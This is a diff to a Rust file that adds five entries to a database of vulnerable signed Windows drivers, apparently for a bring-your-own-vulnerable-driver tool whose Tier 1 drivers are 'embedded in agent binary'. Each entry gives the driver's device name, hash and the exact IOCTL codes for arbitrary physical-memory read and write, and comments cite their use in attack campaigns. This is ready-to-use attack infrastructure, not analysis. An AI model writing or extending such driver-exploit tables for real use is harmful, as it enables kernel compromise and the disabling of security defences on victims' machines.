@@ -66,7 +66,11 @@ pub struct VulnerableDriver {
 /// 1. DBUtil_2_3.sys (Dell) — most widely deployed, direct phys mem R/W
 /// 2. rtcore64.sys (MSI Afterburner) — gaming PCs, direct phys mem R/W
 /// 3. gdrv.sys (Gigabyte) — direct phys mem R/W
-/// 4–8. Additional drivers for fallback / future expansion
+/// 4. ene.sys (ENE Technology) — direct phys mem R/W
+/// 5. procexp152.sys (Sysinternals Process Explorer) — direct phys mem R/W
+/// 6. cpuz141.sys (CPUID CPU-Z v1.41) — direct phys mem R/W
+/// 7. MsIo64.sys (MICSYS hardware utility) — direct phys mem R/W
+/// 8. iQVW64.SYS (Intel NIC diagnostic) — MMIO-mapped phys mem R/W
 pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
     // ── Tier 1: Embedded in agent binary ──────────────────────────────
 
@@ -86,7 +90,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         write_ioctl: 0x222068,
         needs_physical_addr: false,
     },
-
     // rtcore64.sys — Micro-Star MSI Afterburner / RivaTuner driver.
     // Uses MmMapIoSpace internally, so virtual addresses work fine.
     VulnerableDriver {
@@ -100,7 +103,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         write_ioctl: 0x8000204C,
         needs_physical_addr: false,
     },
-
     // gdrv.sys — Giga-BYTE NonPnP Driver (GIO).
     // Uses MmMapIoSpace internally, so virtual addresses work fine.
     VulnerableDriver {
@@ -114,7 +116,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         write_ioctl: 0x9E3AEC1C,
         needs_physical_addr: false,
     },
-
     // ── Tier 2: Reference only (not embedded) ─────────────────────────
 
     // All three mapping types (PhysicalMemory, MmioMapping, PortIo) are now
@@ -140,7 +141,6 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         write_ioctl: 0x8020E004,
         needs_physical_addr: false,
     },
-
     // procexp152.sys — Process Explorer driver (Sysinternals).
     // Uses MmMapIoSpace + MmGetPhysicalAddress internally.
     VulnerableDriver {
@@ -152,6 +152,50 @@ pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
         mapping_type: DriverMapping::PhysicalMemory,
         read_ioctl: 0x6D008,
         write_ioctl: 0x6D00C,
+        needs_physical_addr: false,
+    },
+    // cpuz141.sys — CPUID CPU-Z hardware profiler v1.41.
+    // Exploited for direct physical memory read/write in multiple BYOVD campaigns.
+    // IOCTL codes documented in KDU (hfiref0x) and public CVE analyses.
+    // Device created as \\Device\\cpuz141 with symlink \\DosDevices\\cpuz141.
+    VulnerableDriver {
+        name: "cpuz141.sys",
+        device_name: "cpuz141",
+        sha256: "ded2927f9a4e64eefd09d0caba78e94f309e3a6292841ae81d5528cab109f95d",
+        read_phys_fn: "DeviceIoControl",
+        write_phys_fn: "DeviceIoControl",
+        mapping_type: DriverMapping::PhysicalMemory,
+        read_ioctl: 0x9C402580,
+        write_ioctl: 0x9C402584,
+        needs_physical_addr: false,
+    },
+    // MsIo64.sys — MICSYS hardware utility driver (MSI motherboard tooling).
+    // Allows direct physical memory read/write via NtDeviceIoControlFile.
+    // IOCTL codes from KDU project (hfiref0x, MIT license) and public analysis.
+    VulnerableDriver {
+        name: "MsIo64.sys",
+        device_name: "MsIo64",
+        sha256: "0f035948848432bc243704041739e49b528f35c82a5be922d9e3b8a4c44398ff",
+        read_phys_fn: "DeviceIoControl",
+        write_phys_fn: "DeviceIoControl",
+        mapping_type: DriverMapping::PhysicalMemory,
+        read_ioctl: 0x80102040,
+        write_ioctl: 0x80102044,
+        needs_physical_addr: false,
+    },
+    // iQVW64.SYS — Intel Network Adapter Diagnostic Driver.
+    // Maps physical memory pages into user space via MmMapIoSpace.
+    // Exploited by Nobelium / LAPSUS$ and documented in Elastic BYOVD research.
+    // SHA-256 from LOLDrivers (loldrivers.io) community database.
+    VulnerableDriver {
+        name: "iQVW64.SYS",
+        device_name: "IQVW64e",
+        sha256: "19bf0d0f55d2ad33ef2d105520bde8fb4286f00e9d7a721e3c9587b9408a0775",
+        read_phys_fn: "DeviceIoControl",
+        write_phys_fn: "DeviceIoControl",
+        mapping_type: DriverMapping::MmioMapping,
+        read_ioctl: 0x80862008,
+        write_ioctl: 0x80862008,
         needs_physical_addr: false,
     },
 ];
